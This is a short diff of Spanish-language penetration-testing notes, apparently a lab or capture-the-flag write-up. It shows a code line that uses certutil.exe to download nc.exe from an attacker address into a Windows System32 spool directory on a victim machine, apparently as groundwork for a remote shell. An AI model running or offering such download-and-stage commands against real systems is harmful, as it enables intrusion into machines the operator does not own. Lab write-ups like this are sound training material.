@@ -332,3 +332,9 @@ podemos ver que nuestro servidor ha recibido una petición por `GET` con un cód
 usando el binario de `nc.exe` vamos a usarlo para subirlo a la maquina victima usando un comando que nos permita subirlo
 ![[Pasted image 20240520172126.png]]
 
+
+![[Pasted image 20240520172934.png]]
+```python
+system("certutil.exe -f -urlcache -split http://10.10.14.30/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
+
+```
